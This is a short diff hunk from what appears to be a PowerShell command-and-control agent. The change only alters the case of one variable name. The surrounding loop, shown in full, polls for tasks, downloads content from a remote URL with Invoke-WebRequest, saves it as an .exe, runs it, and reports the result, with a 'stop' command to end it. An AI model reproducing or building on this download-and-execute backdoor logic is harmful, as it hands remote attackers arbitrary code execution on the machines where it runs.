@@ -42,7 +42,7 @@ while ($true) {
         if ($uuid -and $auth -eq $ca) {
             $taskContent = Invoke-WebRequest -Uri $task -UseBasicParsing
             $taskContent.Content | Out-File -FilePath "$dir\$uuid.exe" -Force
-            $Code = Execute "$dir\$uuid.exe"
+            $code = Execute "$dir\$uuid.exe"
             $dat = "$uuid:$code"
             $uuid = $null
         } elseif ($task -eq "stop") {
